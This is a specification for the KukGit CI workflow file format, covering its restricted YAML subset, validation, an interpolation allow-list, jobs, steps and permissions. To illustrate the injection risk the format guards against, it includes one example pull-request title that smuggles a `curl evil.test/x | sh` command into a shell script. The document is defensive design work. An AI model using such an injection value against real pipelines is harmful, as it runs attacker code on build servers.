# KukGit Workflow Format

The file format for hosted CI. This is the first piece of that program: parsing
and validation only. Nothing in this document executes yet — see
[Non-goals](#non-goals-for-this-version) for what is deliberately not here.

Workflow files live in `.kukgit/workflows/*.yml` in a repository.

## A workflow

```yaml
name: CI

on:
  push:
    branches: [main, 'release/*']
  pull_request:
    types: [opened, synchronize]

env:
  NODE_ENV: test

concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true

jobs:
  test:
    runs-on: kukgit-linux
    timeout-minutes: 20
    steps:
      - uses: kukgit/checkout@v1.2.0
      - name: Install and test
        run: |
          npm ci
          npm test

  deploy:
    needs: [test]
    runs-on: kukgit-linux
    permissions:
      contents: read
    steps:
      - name: Deploy
        env:
          TITLE: ${{ github.event.pull_request.title }}
          TOKEN: ${{ secrets.DEPLOY_TOKEN }}
        run: ./deploy.sh "$TITLE"
```

## The YAML subset

Workflow files are parsed by KukGit's own parser, which accepts a deliberately
small subset of YAML. Full YAML is a large language, and several of its features
are actively dangerous in a file that decides what a build server executes.

**Supported:** block mappings and sequences, single-line flow sequences (`[a, b]`)
and mappings (`{k: v}`), plain and quoted scalars, literal (`|`) and folded (`>`)
block scalars with `-`/`+` chomping, comments, and the `null` / boolean / number
scalar types.

**Rejected, with the line number and the reason:**

| Construct | Why |
| --- | --- |
| anchors `&x` and aliases `*x` | a small file can expand into an enormous one, and a value's origin becomes invisible |
| merge keys `<<:` | hides where a setting came from, so reviewing the file no longer tells you what runs |
| tags `!!type` | invites type-directed parsing of untrusted input |
| multiple documents `---` / `...` | ambiguity about which document is the workflow |
| tab indentation | a classic silent-misparse; YAML forbids it and so does this parser |
| duplicate keys | one of the two was meant, and guessing which is not acceptable |

Limits: 128 KiB, 4000 lines, 12 levels of nesting, 5000 values. Each fails closed
with a `413`.

A `#` inside a `|` or `>` block scalar is **script**, not a comment. The block is
taken literally, including trailing whitespace.

## Validation

Every rejection is a structured `400` naming the exact path in the file:

```
.kukgit/workflows/ci.yml: jobs.build.steps[0].run: 'github.event.pull_request.title'
may not be interpolated into a run script because its value can be supplied by
whoever triggered the workflow. Pass it through env: instead, so the shell
receives it as data rather than as code.
```

**Unknown keys are refused, not ignored.** A misspelled `timout-minutes` is how a
workflow silently stops doing what its author plainly wrote, so the error names
the key and lists the supported ones.

## The interpolation rule

This is the most important rule in the format, and the one that differs most from
what you may be used to.

A `run:` script becomes a shell script. Anything interpolated into it is **code**,
not data. The well-known CI vulnerability class is a pull-request title, branch
name or comment body — all attacker-supplied — being pasted into a script:

```yaml
# rejected
- run: echo "${{ github.event.pull_request.title }}"
```

A title of `"; curl evil.test/x | sh; #` ends the quote and runs a command.

KukGit refuses this at validation time. Inside `run:`, only fields on an
**allow-list** may be interpolated:

```
github.sha              github.ref             github.ref_name       github.ref_type
github.base_ref         github.repository      github.repository_owner
github.repository_id    github.workflow        github.job            github.run_id
github.run_number       github.run_attempt     github.workspace      github.event_name
github.actor            github.actor_id        github.triggering_actor
```

An allow-list rather than a deny-list, because a deny-list has to predict every
unsafe field including ones added later. Anything not on the list is refused even
if it looks harmless.

Everything else — including all of `github.event.*`, `github.head_ref`, and every
secret — goes through `env:`:

```yaml
# accepted
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "$TITLE"
```

The runner passes environment variables to the process directly. The value is
never part of the command text, so the shell never parses it as syntax.

**Secrets follow the same rule**, and this is stricter than most CI systems. A
secret interpolated into a command line ends up in the process table, in shell
traces and in anything that logs commands. Through `env:` it does not.

Action inputs (`with:`) accept any context: they are passed as arguments, never
assembled into a command string.

## Reference

### Top level

| Key | |
| --- | --- |
| `name` | optional label |
| `on` | **required** — when the workflow runs |
| `env` | environment variables for every job |
| `permissions` | default token permissions |
| `concurrency` | `group` and `cancel-in-progress` |
| `jobs` | **required** — at least one |

### Events

`push`, `pull_request`, `tag`, `schedule`, `manual`. Short forms are accepted:
`on: push` and `on: [push, pull_request]`.

| Event | Filters |
| --- | --- |
| `push` | `branches`, `branches-ignore`, `paths`, `paths-ignore` |
| `pull_request` | the above plus `types` (`opened`, `reopened`, `synchronize`, `ready_for_review`, `closed`) |
| `tag` | `tags`, `tags-ignore` |
| `schedule` | `cron` — five fields, validated per field; no shorthand |
| `manual` | `inputs` |

Cron is validated strictly because a schedule that is silently misread runs at
the wrong time forever, which is worse than a rejected file.

### Jobs

| Key | |
| --- | --- |
| `runs-on` | **required** — runner label; checked against `KUKGIT_WORKFLOW_ALLOWED_RUNNERS` when set |
| `steps` | **required** — at least one |
| `name`, `if`, `env`, `permissions` | optional |
| `needs` | job ids that must finish first |
| `timeout-minutes` | 1 to `KUKGIT_WORKFLOW_MAX_TIMEOUT_MINUTES` (default 360); defaults to 60 |

Job ids must match `^[A-Za-z_][A-Za-z0-9_-]*$`. `needs` is resolved into a
topological order; a cycle is rejected with the actual path through the graph
(`a -> c -> b -> a`), because "there is a cycle somewhere in 30 jobs" is not
something anyone can act on.

### Steps

A step defines **exactly one** of `run` or `uses`.

| Key | |
| --- | --- |
| `run` | shell script; `shell` (`bash` or `sh`) and `working-directory` apply |
| `uses` | `owner/name@ref`, or `owner/name/subpath@ref`; `with` applies |
| `name`, `id`, `if`, `env` | optional |
| `continue-on-error`, `timeout-minutes` | optional |

`working-directory` must be relative and must not contain `..`.

**Action references must be pinned.** `@main`, `@master`, `@latest` and `@HEAD`
are rejected: a moving reference means the code a build runs can change without
this file changing, which would make reviewing it meaningless. Pin to a tag or a
commit.

### Environment variables

Names must match `^[A-Za-z_][A-Za-z0-9_]*$`. The prefixes `GITHUB_`, `KUKGIT_`,
`RUNNER_` and `CI_KUKGIT` are reserved — they are the runner's own namespace, and
a workflow that could overwrite them could lie to its own steps about where it is
running.

### Permissions

Scopes: `contents`, `pull-requests`, `issues`, `statuses`, `packages`, `actions`.
Levels: `none`, `read`, `write`.

Workflow permissions never widen what the actor already has. Repository
permission and branch protection are enforced server-side and are not affected by
anything in this file — see [BRANCH_GOVERNANCE.md](BRANCH_GOVERNANCE.md).

## Instance policy

| Variable | |
| --- | --- |
| `KUKGIT_WORKFLOW_ALLOWED_RUNNERS` | comma-separated labels; empty means no restriction |
| `KUKGIT_WORKFLOW_ALLOWED_ACTION_OWNERS` | comma-separated owners; empty means no restriction |
| `KUKGIT_WORKFLOW_MAX_JOBS` | default 50 |
| `KUKGIT_WORKFLOW_DEFAULT_TIMEOUT_MINUTES` | default 60 |
| `KUKGIT_WORKFLOW_MAX_TIMEOUT_MINUTES` | default 360 |

Empty means unrestricted, and the rejection message lists what *is* permitted, so
a restriction is never invisible.

Structural limits are fixed: 50 jobs, 100 steps per job, 500 steps per workflow,
64 KiB per `run` script, 100 environment variables per scope.

## Non-goals for this version

Stated explicitly, so their absence is a decision rather than an oversight:

- **`strategy` / matrix builds.** Multiplies the job graph and needs its own
  fan-out limits; deferred until job scheduling exists.
- **Reusable workflows** (`uses:` at the job level) and `workflow_call`.
- **`container:` and `services:`.** Runner isolation must be designed first.
- **`defaults:`**, job `outputs`, and composite actions.
- **Expression evaluation.** Expressions are parsed and their contexts checked,
  but nothing is evaluated — `if:` conditions are stored, not resolved.
- **Execution.** No runner, no scheduling, no log streaming, no artifacts. Those
  are the remaining P1 items in [TODO.md](TODO.md), and each needs the isolation
  and abuse controls described in [OPERATIONS_BOUNDARY.md](OPERATIONS_BOUNDARY.md).

A workflow file that validates today is a description of intent, nothing more.
